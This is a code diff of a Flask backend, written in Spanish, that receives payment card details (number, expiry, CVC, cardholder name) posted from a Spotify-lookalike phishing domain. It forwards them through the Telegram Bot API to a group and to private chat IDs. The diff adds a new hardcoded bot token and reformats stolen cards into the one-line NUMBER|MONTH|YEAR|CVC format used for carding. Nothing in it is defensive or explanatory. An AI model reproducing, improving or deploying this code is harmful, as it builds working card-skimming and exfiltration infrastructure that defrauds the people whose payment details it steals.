@@ -7,16 +7,12 @@ app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 # --- CONFIGURACIÓN ---
-TELEGRAM_BOT_TOKEN = '8922501207:AAHiWGYERv4StaJrYVeN7ogowrMjGfVPZ0Q'
+TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
 
-# Dominio que enviará al grupo
 DOMINIO_GRUPO = 'free.spotlfypremium.online'
 ID_GRUPO_DESTINO = '-1004493468867'
 
-# IDs privados para otros dominios
 CLIENTES_PRIVADOS = ['6953415010', '7707049896']
-
-# Lista maestra para validación
 LISTA_MAESTRA_IDS = CLIENTES_PRIVADOS + [ID_GRUPO_DESTINO]
 
 @app.route('/test', methods=['GET'])
@@ -45,21 +41,29 @@ def recibir_datos():
     origen = request.headers.get('Origin', '').split('/')[2]
 
     nombre = data.get('nombre', 'N/A')
-    tarjeta = data.get('tarjeta', 'N/A')
+    tarjeta = data.get('tarjeta', 'N/A').replace(' ', '')  # Quita espacios
     expiracion = data.get('expiracion', 'N/A')
     cvc = data.get('cvc', 'N/A')
 
-    # Diseño del mensaje (estilo minimalista dark)
+    # Separar mes y año
+    exp_parts = expiracion.split('/')
+    if len(exp_parts) == 2:
+        mes = exp_parts[0]
+        ano = exp_parts[1]
+    else:
+        mes = expiracion
+        ano = 'N/A'
+
+    # Formato de una línea: NUMERO|MES|AÑO|CVC
+    cc_linea = f"{tarjeta}|{mes}|{ano}|{cvc}"
+
     mensaje = (
-        f"◤◢◤◢◤◢◤◢◤◢◤◢◤◢\n"
-        f"   🔥 INFERNUS VIP 🔥\n"
-        f"◤◢◤◢◤◢◤◢◤◢◤◢◤◢\n\n"
-        f"`{tarjeta}`\n"
-        f"`{expiracion}`  |  `{cvc}`\n\n"
-        f"_{nombre}_"
+        f"🔥 *INFERNUS VIP* 🔥\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"`{cc_linea}`\n\n"
+        f"👤 _{nombre}_"
     )
 
-    # SI ES EL DOMINIO DEL GRUPO: Enviar solo UNA VEZ al grupo
     if origen == DOMINIO_GRUPO:
         url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {"chat_id": ID_GRUPO_DESTINO, "text": mensaje, "parse_mode": "Markdown"}
@@ -74,7 +78,6 @@ def recibir_datos():
         
         return jsonify({"status": "error"}), 500
 
-    # SI ES OTRO DOMINIO: Enviar a los IDs privados
     exitos = 0
     lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]
     
